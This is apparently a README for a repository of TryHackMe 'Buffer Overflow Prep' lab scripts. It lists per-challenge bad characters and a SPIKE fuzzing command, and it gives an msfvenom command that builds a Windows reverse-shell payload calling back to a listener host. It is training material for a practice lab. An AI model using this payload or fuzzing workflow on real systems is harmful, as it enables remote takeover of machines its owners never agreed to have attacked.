# THM_Buffer-Overflow-Prep

Each folder numbered from 1 to x contains the scripts from fuzzing to the stage of creating a final **exploit**

Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverflowprep

**command used for shellcode generation to Fit with scripts**

     msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "<badChars-specific-to-overflow>" EXITFUNC=thread -v shellcode

**command to be used with spike scripts to find payload triggering the crash**

     generic_send_tcp <target-ip> 1337{this port is specific to the oscp.exe} fuzz.spk 0 0
    
 More on spike:--> https://resources.infosecinstitute.com/topic/intro-to-fuzzing/
  
# About Fuzz.py Scripts
     
**The fuzz.py scripts will not Display the output Till you press CTRL + C {yeah I know add a except statement but i find no use in it lol} For this very reason a time dealy of 5 seconds is Added so as soon as you see the application crash in immunity press CTRL + C{in 5 sec delay} to stop the script and this would also give us the bytes at which application crashed**
     
     
# OVERFLOW 1

**Bad Chars:--> \x00\x07\x2e\xa0**


# OVERFLOW 2

**Bad Chars:--> \x00\x23\x3c\x83\xa0\xba**

# OVERFLOW 3

**Bad Chars:--> \x00\x11\x40\x5f\xb8\xee**

# OVERFLOW 4

**Bad Chars:--> \x00\xa9\xcd\xd4**

# OVERFLOW 5

**Bad Chars:--> \x00\x16\x2f\xf4\xfd**

# OVERFLOW 6

**Bad Chars:--> \x00\x08\x2c\xad**

# OVERFLOW 7

**Bad Chars:--> \x00\x8c\xae\xbe\xfb**

               # Important Note

     → Our Fuzz script crashed the script at 1300 bytes but we see that the EIP register is still not reached or in other words still not Filled with  all A's which it ideally should be so we increase the buffer from 1300 to 1400 and this time it does fill EIP with 41414141 which is when we are good to Go :)


# NOTE

  *The badChars scripts present in each overflow directory contains a badChars variable from which also badchars specific to the overflow have been eliminated* 
  
 **scripts are to be run with python but you may adjust some encoding in place to make them work with python3** 
 
**Other Overflows will be added as I do them**
